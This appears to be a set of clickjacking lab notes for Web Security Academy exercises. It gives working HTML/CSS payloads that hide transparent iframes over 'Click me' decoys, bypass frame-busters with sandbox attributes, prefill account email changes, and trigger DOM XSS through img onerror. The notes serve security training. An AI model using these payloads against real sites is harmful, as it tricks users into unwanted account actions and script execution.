## LAB Payloads

### Basic attack
```html
<head>
	<style>
		#target_website {
			position:relative;
			width:128px;
			height:128px;
			opacity:0.00001;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			width:300px;
			height:400px;
			z-index:1;
			}
	</style>
</head>
...
<body>
	<div id="decoy_website">
	...decoy web content here...
	</div>
	<iframe id="target_website" src="https://vulnerable-website.com">
	</iframe>
</body>
```
### Frame busting
```html
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe> # Both the allow-forms 
and allow-scripts values permit the specified actions within the iframe but top-level navigation is disabled.
```

```html
# Basic clickjacking with CSRF token protection
<style>
    iframe {
        position:relative;
        width:700px;
        height: 500px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:500px;
        left:60px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://...web-security-academy.net/my-account"></iframe>

# Clickjacking with form input data prefilled from a URL parameter
<style>
    iframe {
        position:relative;
        width:700px;
        height: 500px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:450px;
        left:100px;
        z-index: 1;
    }
</style>
<div>Click me</div>

<iframe src="https://...web-security-academy.net/my-account?email=kok@kok.com"></iframe>

# Clickjacking with a frame buster script
Look at response and find that there is a frame busting script (something like if (top!=self)):
<style>
    iframe {
        position:relative;
        width:700px;
        height: 500px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:450px;
        left:100px;
        z-index: 1;
    }
</style>
<div>Click me</div>

<iframe src="https://...web-security-academy.net/my-account?email=kok@kok.com" 
sandbox="allow-forms"></iframe> # Notice the use of the sandbox="allow-forms" attribute that neutralizes the frame 
buster script 

# Exploiting clickjacking vulnerability to trigger DOM-based XSS
find feedback section and look it script source. somewhere there should exist xss
#"><img src=/ onerror=print()> - check for xss
<style>
    iframe {
        position:relative;
        width:900px;
        height: 900px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:800px;
        left:100px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe
src="https://...web-security-academy.net/feedback?name=<img src=22 onerror=print()>&email=kek@kek.
com&subject=1&message=fhfh"></iframe>

<style>
	iframe {
		position:relative;
		width:$width_value;
		height: $height_value;
		opacity: $opacity;
		z-index: 2;
	}
	div {
		position:absolute;
		top:$top_value;
		left:$side_value;
		z-index: 1;
	}
</style>
<div>Test me</div>
<iframe
src="YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.
com&subject=test&message=test#feedbackResult"></iframe>

# Multistep clickjacking
<style>
    iframe {
        position:relative;
        width:800px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    .first_div {
        position:absolute;
        top:500px;
        left:70px;
        z-index: 1;
    }
    .second_div {
        position:absolute;
        top:290px;
        left:200px;
        z-index: 1;
    }

</style>
<div class="first_div">Click me first</div>
<div class="second_div">Click me next</div>
<iframe
src="https://...web-security-academy.net/my-account/"></iframe>

<style>
	iframe {
		position:relative;
		width:$width_value;
		height: $height_value;
		opacity: $opacity;
		z-index: 2;
	}
        .firstClick, .secondClick {
		position:absolute;
		top:$top_value1;
		left:$side_value1;
		z-index: 1;
	}
        .secondClick {
		top:$top_value2;
		left:$side_value2;
	}
</style>
<div class="firstClick">Test me first</div>
<div class="secondClick">Test me next</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```